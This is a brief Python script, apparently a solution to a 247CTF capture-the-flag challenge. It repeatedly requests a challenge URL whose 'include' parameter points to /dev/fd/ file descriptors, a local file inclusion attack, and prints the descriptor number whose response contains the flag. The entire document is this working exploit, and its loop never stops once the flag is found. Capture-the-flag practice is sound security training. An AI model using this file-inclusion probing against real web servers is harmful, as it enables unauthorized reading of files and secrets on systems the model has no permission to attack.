#!/usr/bin/python3
import requests
id = 1
while True:
    url = f"https://b43592817022afcb.247ctf.com/?include=/dev/fd/{id}"
    x = requests.get(url)
    if "247CTF" in x.text:
        print(id)
    else:
        id+=1
        

